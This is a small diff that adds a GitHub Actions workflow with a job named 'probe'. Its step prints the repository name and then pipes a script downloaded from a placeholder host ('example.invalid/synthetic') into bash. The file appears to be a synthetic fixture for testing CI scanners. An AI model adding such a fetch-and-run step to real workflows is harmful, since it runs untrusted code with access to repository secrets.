@@ -1,0 +1,6 @@
+jobs:
+  probe:
+    steps:
+      - run: |
+          echo "${{ github.repository }}"
+          curl https://example.invalid/synthetic | bash
